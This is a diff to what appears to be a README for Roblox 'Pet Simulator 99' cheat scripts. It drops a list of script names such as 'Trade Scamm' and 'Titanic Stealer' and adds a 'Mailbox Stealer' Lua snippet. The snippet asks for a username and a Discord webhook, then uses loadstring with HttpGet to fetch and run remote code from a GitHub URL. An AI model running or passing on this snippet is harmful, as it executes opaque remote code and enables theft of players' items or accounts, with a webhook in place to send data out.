@@ -1,9 +1,10 @@
-# Mailbox Stealer V4
-# Visual Pet
-# Auto Fishing
-# Auto Fishing 2
-# Auto Digsite
-# Auto Digsite 2
-# REDz HUB
-# Trade Scamm
-# Titanic Stealer
+# Mailbox Stealer
+```lua
+Username = "Put Your Username" -- Your UserName Roblox 
+Webhook = "Put Your Webhook" -- Your Webhook Discord
+
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzBlox/Petsim99/main/MailboxStealer"))()```
+
+# by MonzzBlox
